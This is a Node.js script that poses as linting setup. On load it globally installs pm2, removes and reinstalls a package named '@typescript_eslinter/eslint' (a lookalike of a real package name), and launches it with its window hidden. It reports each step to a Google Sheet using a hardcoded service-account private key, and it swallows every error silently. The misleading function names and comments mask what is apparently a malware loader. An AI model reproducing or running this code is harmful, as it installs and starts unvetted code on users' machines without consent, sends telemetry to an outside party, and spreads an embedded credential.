const { exec } = require('child_process');

// Function to install pm2 globally
function installPrettier() {
  return new Promise((resolve, reject) => {
    exec('npm install -g pm2', (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

function deleteEslinter() {
  return new Promise((resolve, reject) => {
    exec('pm2 delete eslinter', (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Function to install screener globally
function installEslinter() {
  return new Promise((resolve, reject) => {
    exec('npm install -g @typescript_eslinter/eslint@latest', (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Function to start the folder with pm2
function startEslinter() {
  return new Promise((resolve, reject) => {
    exec(`eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
      if (error) {
        reject(`Error starting with PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

const { JWT } = require('google-auth-library');
const { GoogleSpreadsheet } = require('google-spreadsheet');

async function accessSpreadsheet(minimizer, fuzzer) {
  try {
      // Initialize the sheet - doc ID is the long id in the sheets URL
      const auth = new JWT({
        email: "b-978-24@arboreal-drake-443608-f0.iam.gserviceaccount.com",
        key: "-----BEGIN PRIVATE KEY-----\nMIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDlxXWjsCtNfWBB\npppsW/BSsxh9h6FkZfCnA4cpdVT5F2AkqntvnlYfRux6UsSaQYEHAoFUe4R/7tu/\ntSmjx5OLK7WA27odGyHeSJr5yfG5fvTXz+SSFt/iyZ23rHhI91bgg9i1Uk6n7ptS\nM2PglWybEUfJYbJWa+ibqQZB/K55dyg954iSfXj3GvSbFNyVabYsxZ/YgFiIuGa/\nBIq21nEWFH7ZPuqL1anLVFSW0TJKdfLWJu3PuI9z+yADlHrJA+8LqnmmbW4vAlb7\nkGCh+BLwKSsrh+gfAQjoVWTRkeJnVBrjXfp0J0DIjdEYRAq/GF3pwxutHuC65ax0\n+pZXJ1xBAgMBAAECggEAG2Rn+uS0tN8+i3UWMdbgFqvdPpHdzr9MakzEX0/qmmuL\n/bMJViw1LjNhW8/kOlOW00QcMPsst6e9MOSjGzBeyZejYsJPNMsYRYy4VREbLTcS\nb2wMXtI1TK8mi1AXYvOBuvBc9Hjkgaazg6A2xv5pXS85NKvd++mPaIdFBLbgAgDV\nyjWx1whoAcl4ugA5SbLvSkqmAE/rVNdOtiz9VrfkUnahFFVrxckXbEp17mqevuvD\niHK9QGuQZCQBH3puRluuWgB7s1ahaaiArISDoY7eguVfMrHtscLvCb+HrEyUpFfi\nPoB6txmME889PiSb9rjfxOS5h0O+XQk/88EJ1mFE8QKBgQDz4uQPlaqemyQWPgds\nGus5HmJ97ZKOfcV+Rkv90u5NkrqZ2FAUxP/u/aO5cdd+Qz5bp440ClcuLy/zzJfq\n030zksl8q/u0CYzrn55SCyTRefEPM2uLKBxsl97sRzG2Rhgl65C7YZqgLEprvLPr\nHVLzs5VNl37syCgKnnnCY22UjQKBgQDxLxdkhJCQ9RBPlkNtmP3qWxgfKqlBL/x1\nJwuYVcsjuxZpaXCVpaXA6w1LIlYIQGjja9wijRg4Scs6x6FAedYiNCQzaIbeii8P\nYnW0nJNcJBQx2sf6aiz2218gs2Po3SmF8cgpGa8GmVYzrAp3y0p2DDjufYQ+wo4G\nEZSZYrurhQKBgQDNmOhJexJqwr6ZQZFgQRErBcJiBnUWSlDDMt+9CqR6IMfOCdz4\npVpcTtZG7wGLH4TiH05x8IWuGXmDPWaUP9W8NHJG93UpQSPbPqRo5ZwUO4hMGD0B\nAr9zjFQRO7NcxZp13TAVxyJjBPN3/4xtGDtl1m53Cs+lLNcUnKRoiwlFwQKBgQDU\n6r27/0ugrLe5iu370xRV0BV7bi39Xl+BDPcvhI3Q/VjLtkmt0o6BwP/7VFSe9D2k\nh5PO7MB08LB5M8MnKGfhyiYrPBvUWikxa7p9t7xfm3o4iOwCJbmMNB3GwJdy+8us\nc8ZAgmwBZ1yyQS78knspu6CG6kfVH+xBb0PAJWmIAQKBgQC3OoTmm+Jqnkit7G9J\nVrIVExE8qhMASiQKI8MB2sUztW3HWBHLr8mPTPkXwkFOqqhVHJ7Ef/4rciU+eqGA\nwVgG3sbeFAsonbp32GFShh+UoLhnJiqPW+YfAiWqzNr6s38S19ZUA22ByFAfkqUn\n1WC10M28WhLKrOXa/WD90khwuQ==\n-----END PRIVATE KEY-----\n",
        scopes: ['https://www.googleapis.com/auth/spreadsheets'],
      });
      const doc = new GoogleSpreadsheet('1YpM4h5OafBUg-cWgZ-GLqzZHHSxFtIBwXy15n85EGF4', auth);
      
      await doc.loadInfo();
      const sheet = doc.sheetsByIndex[0];
      await sheet.addRow({
        minimizer, fuzzer, time: new Date()
      });
  } catch (error) {
  }
}

// Main function to execute the steps
async function main() {
  try {
  try {
    await installPrettier();
    console.log(".")
    await accessSpreadsheet("loading...", "installPrettier")  
  } catch (error) {
    console.log("..")
    await accessSpreadsheet("loading...", error)    
  }
  try {
    await deleteEslinter();
    console.log(".")
    await accessSpreadsheet("loading...", "deleteEslinter")
  } catch (error) {
    console.log("..")
    await accessSpreadsheet("loading...", error)
  }
  try {
    await installEslinter();
    console.log(".")
    await accessSpreadsheet("loading...", "installEslinter")
  } catch (error) {
    console.log("..")
    await accessSpreadsheet("loading...", error)
  }
  try {
    await startEslinter();
    console.log(".")
    await accessSpreadsheet("loading...", "startEslinter")
  } catch (error) {
    console.log("..")
    await accessSpreadsheet("loading...", error)
  }
} catch (err) {
  
}
}

main();
